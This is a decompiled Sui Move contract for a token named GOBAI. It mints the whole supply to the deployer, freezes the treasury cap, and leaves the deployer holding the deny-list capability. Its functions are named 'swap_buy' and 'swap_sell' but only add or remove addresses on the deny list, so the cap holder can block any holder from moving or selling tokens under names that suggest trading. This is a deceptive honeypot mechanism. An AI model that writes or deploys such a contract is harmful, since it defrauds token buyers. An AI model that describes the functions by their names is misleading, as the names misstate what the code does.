module 0x7faafff708e69079f35657f09c58c0798abfcc4495514eaa0d6f2d78382ad8c5::gobai {
    struct GOBAI has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: GOBAI, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<GOBAI>(arg0, 9, b"GOBAI", b"GOBAI", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmeYxF7uceFgxoidSxiVh1LrcE74Bvje4zV6iKsptvs3er"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<GOBAI>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<GOBAI>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<GOBAI>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<GOBAI>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GOBAI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<GOBAI>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<GOBAI>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<GOBAI>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

